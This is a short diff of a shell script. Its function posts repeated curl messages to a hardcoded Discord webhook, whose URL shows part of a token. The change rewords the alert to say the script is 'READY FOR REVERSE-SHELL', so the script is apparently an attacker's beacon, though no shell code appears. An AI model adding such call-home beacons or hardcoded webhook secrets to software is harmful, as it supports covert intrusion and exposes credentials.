@@ -11,7 +11,7 @@ webhook_url="https://discord.com/api/webhooks/1264765951304400988/n9j21NuQaNl6kJ
 send_discord_alert() {
     for i in {1..5}; do
         curl -H "Content-Type: application/json" \
-            -d '{"content": "ALERT"}' \
+            -d '{"content": "SCRIPT TRIGERD READY FOR REVERSE-SHELL"}' \
             $webhook_url
         sleep 1
     done
